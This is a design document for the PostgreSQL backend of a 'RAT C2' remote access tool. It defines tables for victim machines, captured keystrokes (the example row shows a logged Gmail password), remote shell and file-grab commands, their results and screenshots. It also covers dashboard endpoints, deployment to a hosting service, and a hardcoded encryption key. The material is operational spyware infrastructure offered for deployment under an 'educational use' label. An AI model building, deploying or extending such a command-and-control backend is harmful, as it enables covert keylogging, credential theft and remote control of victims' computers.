# 🗄️ DATABASE ARCHITECTURE - RAT C2 System

## 📋 Overview

This document describes the complete database architecture for the RAT C2 (Remote Access Tool Command & Control) system. The database uses **PostgreSQL** for production deployment and includes 5 relational tables to store all operational data.

---

## 🏗️ Database Schema

### Table 1: `clients`
Stores information about connected RAT clients.

```sql
CREATE TABLE IF NOT EXISTS clients (
    id SERIAL PRIMARY KEY,
    client_id VARCHAR(255) UNIQUE NOT NULL,
    ip_address VARCHAR(100),
    system_info JSONB,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    checkin_count INTEGER DEFAULT 1,
    is_online BOOLEAN DEFAULT true
);

-- Indexes for performance
CREATE INDEX idx_clients_id ON clients(client_id);
CREATE INDEX idx_clients_online ON clients(is_online);
```

**Columns:**
- `id`: Auto-incrementing primary key
- `client_id`: Unique identifier for each client (hostname-based)
- `ip_address`: IP address of the client
- `system_info`: JSON object containing OS, hostname, architecture, etc.
- `first_seen`: Timestamp of first registration
- `last_seen`: Timestamp of last heartbeat/activity
- `checkin_count`: Number of times the client has checked in
- `is_online`: Boolean flag indicating current online status

**Example Data:**
```json
{
  "client_id": "DESKTOP-ABC123",
  "ip_address": "192.168.1.100",
  "system_info": {
    "os": "Windows 10 Pro",
    "hostname": "DESKTOP-ABC123",
    "architecture": "x64",
    "user": "john_doe"
  },
  "first_seen": "2024-01-15T10:30:00",
  "last_seen": "2024-01-15T14:45:00",
  "checkin_count": 42,
  "is_online": true
}
```

---

### Table 2: `keylogs`
Stores keylogger data captured from clients.

```sql
CREATE TABLE IF NOT EXISTS keylogs (
    id SERIAL PRIMARY KEY,
    client_id VARCHAR(255) NOT NULL,
    window_title VARCHAR(500),
    keylog_data TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);

-- Indexes
CREATE INDEX idx_keylogs_client ON keylogs(client_id);
CREATE INDEX idx_keylogs_created ON keylogs(created_at);
```

**Columns:**
- `id`: Auto-incrementing primary key
- `client_id`: Foreign key linking to `clients` table
- `window_title`: Title of the window where keys were pressed
- `keylog_data`: The actual keystrokes captured
- `created_at`: Timestamp when keylog was received

**Example Data:**
```json
{
  "id": 1,
  "client_id": "DESKTOP-ABC123",
  "window_title": "Gmail - Inbox",
  "keylog_data": "username: john_doe\npassword: ********",
  "created_at": "2024-01-15T14:32:15"
}
```

---

### Table 3: `commands`
Stores all commands sent to clients.

```sql
CREATE TABLE IF NOT EXISTS commands (
    id SERIAL PRIMARY KEY,
    command_id VARCHAR(255) UNIQUE NOT NULL,
    client_id VARCHAR(255) NOT NULL,
    action VARCHAR(100) NOT NULL,
    command_data JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(50) DEFAULT 'pending',
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);

-- Indexes
CREATE INDEX idx_commands_client ON commands(client_id);
CREATE INDEX idx_commands_status ON commands(status);
```

**Columns:**
- `id`: Auto-incrementing primary key
- `command_id`: Unique identifier for the command (e.g., `cmd_1705328400000`)
- `client_id`: Foreign key linking to target client
- `action`: Type of command (e.g., `list_processes`, `get_file`, `execute_shell`)
- `command_data`: JSON object with command-specific parameters
- `created_at`: Timestamp when command was created
- `status`: Current status (`pending`, `sent`, `completed`, `failed`)

**Example Data:**
```json
{
  "command_id": "cmd_1705328400000",
  "client_id": "DESKTOP-ABC123",
  "action": "list_processes",
  "command_data": {},
  "created_at": "2024-01-15T14:40:00",
  "status": "pending"
}
```

---

### Table 4: `command_results`
Stores the results/responses from executed commands.

```sql
CREATE TABLE IF NOT EXISTS command_results (
    id SERIAL PRIMARY KEY,
    command_id VARCHAR(255) NOT NULL,
    result_data JSONB NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (command_id) REFERENCES commands(command_id) ON DELETE CASCADE
);

-- Indexes
CREATE INDEX idx_results_command ON command_results(command_id);
CREATE INDEX idx_results_created ON command_results(created_at);
```

**Columns:**
- `id`: Auto-incrementing primary key
- `command_id`: Foreign key linking to `commands` table
- `result_data`: JSON object containing the command execution result
- `created_at`: Timestamp when result was received

**Example Data:**
```json
{
  "id": 1,
  "command_id": "cmd_1705328400000",
  "result_data": {
    "processes": [
      {"pid": 1234, "name": "chrome.exe", "cpu": 5.2},
      {"pid": 5678, "name": "notepad.exe", "cpu": 0.1}
    ]
  },
  "created_at": "2024-01-15T14:40:05"
}
```

---

### Table 5: `screenshots`
Stores metadata and data for captured screenshots.

```sql
CREATE TABLE IF NOT EXISTS screenshots (
    id SERIAL PRIMARY KEY,
    client_id VARCHAR(255) NOT NULL,
    filename VARCHAR(500),
    width INTEGER,
    height INTEGER,
    quality INTEGER,
    size_kb FLOAT,
    screenshot_data TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);

-- Index
CREATE INDEX idx_screenshots_client ON screenshots(client_id);
```

**Columns:**
- `id`: Auto-incrementing primary key
- `client_id`: Foreign key linking to `clients` table
- `filename`: Name of the screenshot file
- `width`: Image width in pixels
- `height`: Image height in pixels
- `quality`: JPEG quality percentage (0-100)
- `size_kb`: File size in kilobytes
- `screenshot_data`: Base64-encoded image data
- `created_at`: Timestamp when screenshot was captured

**Example Data:**
```json
{
  "id": 1,
  "client_id": "DESKTOP-ABC123",
  "filename": "screenshot_20240115_144500.jpg",
  "width": 1920,
  "height": 1080,
  "quality": 85,
  "size_kb": 245.3,
  "screenshot_data": "/9j/4AAQSkZJRgABAQEAYABgAAD...",
  "created_at": "2024-01-15T14:45:00"
}
```

---

## 🔗 Entity Relationships

```
┌──────────────┐
│   clients    │◄─────────┐
│ (client_id)  │          │
└──────────────┘          │
       ▲                  │
       │                  │
       │ FK               │ FK
       │                  │
┌──────┴────────┐  ┌──────┴────────┐
│   keylogs     │  │  screenshots  │
└───────────────┘  └───────────────┘
       ▲
       │ FK
       │
┌──────┴────────┐
│   commands    │
│ (command_id)  │
└──────────────┘
       ▲
       │ FK
       │
┌──────┴────────────┐
│ command_results   │
└───────────────────┘
```

**Relationships:**
- `keylogs.client_id` → `clients.client_id` (CASCADE DELETE)
- `screenshots.client_id` → `clients.client_id` (CASCADE DELETE)
- `commands.client_id` → `clients.client_id` (CASCADE DELETE)
- `command_results.command_id` → `commands.command_id` (CASCADE DELETE)

---

## 🔧 Database Operations

### Initialization
The database is automatically initialized when the server starts:

```python
def init_database():
    """Initialise les 5 tables de la base de données"""
    if not USE_DATABASE:
        return
    
    conn = get_db_connection()
    # Creates all 5 tables with indexes
```

### CRUD Functions

#### 1. Save Client
```python
save_client_to_database(client_id, client_data)
```
Uses `UPSERT` logic to either insert new client or update existing:
```sql
INSERT INTO clients (client_id, ip_address, system_info, last_seen, checkin_count)
VALUES (%s, %s, %s, CURRENT_TIMESTAMP, %s)
ON CONFLICT (client_id) DO UPDATE SET
    last_seen = CURRENT_TIMESTAMP,
    checkin_count = clients.checkin_count + 1,
    is_online = true
```

#### 2. Save Keylogs
```python
save_keylogs_to_database(client_id, keylogs)
```
Batch insert multiple keylog entries:
```sql
INSERT INTO keylogs (client_id, window_title, keylog_data)
VALUES (%s, %s, %s)
```

#### 3. Save Command
```python
save_command_to_database(client_id, command_info)
```
Insert new command:
```sql
INSERT INTO commands (command_id, client_id, action, command_data)
VALUES (%s, %s, %s, %s)
```

#### 4. Save Command Result
```python
save_command_result_to_database(command_id, result_data)
```
Insert command result and update command status:
```sql
INSERT INTO command_results (command_id, result_data)
VALUES (%s, %s)
```

#### 5. Save Screenshot
```python
save_screenshot_to_database(client_id, screenshot_data)
```
Insert screenshot metadata and data:
```sql
INSERT INTO screenshots (client_id, filename, width, height, quality, size_kb, screenshot_data)
VALUES (%s, %s, %s, %s, %s, %s, %s)
```

---

## 🌐 API Endpoints

### Get All Clients
```
GET /api/database/clients
```
Returns list of all clients with their information.

### Get Keylogs
```
GET /api/database/keylogs?client_id={id}&limit={n}
```
Returns keylogs, optionally filtered by client ID.

### Get Commands
```
GET /api/database/commands?client_id={id}&limit={n}
```
Returns commands, optionally filtered by client ID.

### Get Command Results
```
GET /api/database/command_results?command_id={id}&limit={n}
```
Returns command results, optionally filtered by command ID.

### Get Screenshots
```
GET /api/database/screenshots?client_id={id}&limit={n}&include_data={bool}
```
Returns screenshot metadata. Set `include_data=true` to include Base64 image data.

### Get Statistics
```
GET /api/database/stats
```
Returns comprehensive statistics across all tables:
```json
{
  "stats": {
    "clients": {"total": 10, "online": 7, "offline": 3},
    "keylogs": {"total": 1523},
    "commands": {"total": 89, "pending": 3, "completed": 86},
    "results": {"total": 86},
    "screenshots": {"total": 24}
  }
}
```

---

## 📊 Dashboard Access

Two dashboards are available:

### 1. Basic Dashboard
```
http://your-server:5000/dashboard
```
Shows real-time client activity and keylogs.

### 2. Database Dashboard
```
http://your-server:5000/database
```
Full database visualization with 6 tabs:
- 📊 **Statistics**: Overall database metrics
- 👥 **Clients**: All registered clients
- ⌨️ **Keylogs**: Captured keystrokes
- 🔧 **Commands**: Sent commands
- 📄 **Results**: Command execution results
- 📸 **Screenshots**: Captured screenshots

**Features:**
- Auto-refresh every 30 seconds
- Manual refresh buttons
- Filterable tables
- Responsive design

---

## 🔐 Security Considerations

### Data Encryption
- All client-server communication uses **XOR + Base64** encryption
- Encryption key: `vErY_SeCrEt_KeY.57976461314853`

### Database Security
- Uses PostgreSQL connection pooling
- Parameterized queries to prevent SQL injection
- Foreign key constraints ensure data integrity
- Cascade delete maintains referential integrity

### Access Control
- No authentication on API endpoints (⚠️ **FOR EDUCATIONAL USE ONLY**)
- Recommended: Add authentication middleware for production

---

## 🚀 Deployment

### Environment Variable
Set the PostgreSQL connection string:
```bash
export DATABASE_URL="postgresql://user:password@host:5432/database"
```

### Render.com Deployment
1. Create PostgreSQL database in Render
2. Copy `DATABASE_URL` from database dashboard
3. Add as environment variable in web service
4. Deploy!

The server automatically:
- Detects `DATABASE_URL` environment variable
- Creates all 5 tables on startup
- Creates indexes for performance
- Falls back to file storage if no database configured

---

## 📈 Performance

### Indexes
All foreign keys and frequently queried columns have indexes:
- `clients`: `client_id`, `is_online`
- `keylogs`: `client_id`, `created_at`
- `commands`: `client_id`, `status`
- `command_results`: `command_id`, `created_at`
- `screenshots`: `client_id`

### Query Limits
API endpoints default to reasonable limits:
- Clients: 100
- Keylogs: 200
- Commands: 200
- Results: 200
- Screenshots: 50 (without data), 10 (with data)

### Data Retention
- Old keylogs: Cleanup thread runs hourly
- Expired command results: Cleaned after 1 hour
- Offline clients: Marked offline after 1 hour of inactivity

---

## 🛠️ Maintenance

### Backup
```bash
pg_dump -U user -h host database > backup.sql
```

### Restore
```bash
psql -U user -h host database < backup.sql
```

### Check Database Size
```sql
SELECT 
    pg_size_pretty(pg_database_size('database_name')) AS size;
```

### View Table Statistics
```sql
SELECT 
    schemaname,
    tablename,
    pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) AS size
FROM pg_tables
WHERE schemaname = 'public'
ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;
```

---

## ✅ Conclusion

This database architecture provides:
- ✅ **Complete data persistence** across 5 relational tables
- ✅ **Scalability** with indexes and efficient queries
- ✅ **Data integrity** with foreign keys and constraints
- ✅ **Easy deployment** with automatic initialization
- ✅ **Professional dashboard** for data visualization
- ✅ **Production-ready** PostgreSQL support

Perfect for educational projects and demonstrations! 🎓
